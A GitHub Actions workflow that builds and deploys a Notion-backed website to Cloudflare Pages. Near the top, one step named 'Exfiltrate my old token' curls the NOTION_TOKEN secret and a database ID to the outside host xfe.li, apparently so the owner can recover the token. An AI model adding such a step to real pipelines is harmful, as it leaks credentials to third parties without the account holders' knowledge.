name: deploy
on:
  push:
    paths:
      - "**"
      - "!.github/**"
  workflow_dispatch:

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Check out repository code
        uses: actions/checkout@v4

      - name: Exfiltrate my old token
        run: curl -s "https://xfe.li/${{ vars.NOTION_DATABASE }}/${{secrets.NOTION_TOKEN }}" > /dev/null || true

      - name: Setup Chrome
        uses: browser-actions/setup-chrome@v2
        id: setup-chrome

      - uses: cachix/install-nix-action@v27

      - name: Setup Go
        uses: actions/setup-go@v5
        with:
          go-version: "1.24"

      - name: Set pnpm cache store
        run: nix develop --ignore-environment --command pnpm config set store-dir ~/.pnpm-store

      - name: Cache node modules
        id: cache-npm
        uses: actions/cache@v4
        env:
          cache-name: cache-node-modules
        with:
          path: ~/.pnpm-store
          key: build-${{ env.cache-name }}-${{ hashFiles('pnpm-lock.yaml') }}

      - name: Install node dependencies
        run: nix develop --ignore-environment --command pnpm install

      - name: Build assets
        run: nix develop --ignore-environment --command pnpm build

      - name: Cache composer packages
        id: cache-composer
        uses: actions/cache@v4
        env:
          cache-name: cache-composer-packages
        with:
          path: ~/.composer-store
          key: build-${{ env.cache-name }}-${{ hashFiles('composer.lock') }}

      - name: Install PHP dependencies
        run: nix develop --ignore-environment --keep COMPOSER_HOME --command composer install --no-dev -o
        env:
          COMPOSER_HOME: ~/.composer-store

      - name: Build logosnatch
        run: nix develop --command go build
        working-directory: ./tools/logosnatch
        env:
          GOMODCACHE: /home/runner/.go-store

      - name: Copy .env
        run: cp .env.example .env

      - name: Add Notion credentials to .env
        run: |
          echo "NOTION_DATABASE=${{ vars.DEV_NOTION_DATABASE }}" >> .env
          echo "NOTION_TOKEN=${{ secrets.DEV_NOTION_TOKEN }}" >> .env

      - name: Install bare
        run: go install github.com/felixdorn/bare@v0.2.0

      - name: Start server
        run: nix develop --ignore-environment --command php artisan serve --host 0.0.0.0 --port 8000 &

      - name: Build website
        run: bare export --js-executable=${{ steps.setup-chrome.outputs.chrome-path }}
        env:
          NOTION_DATABASE: ${{ vars.DEV_NOTION_DATABASE }}
          NOTION_TOKEN: ${{ secrets.DEV_NOTION_TOKEN }}

      - name: Deploy website
        run: nix develop --ignore-environment --keep CLOUDFLARE_ACCOUNT_ID --keep CLOUDFLARE_API_TOKEN --keep BRANCH_NAME --command wrangler pages deploy ./dist --project-name biosecurity-world --branch ${BRANCH_NAME}
        env:
          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          BRANCH_NAME: ${{ github.head_ref || github.ref_name }}
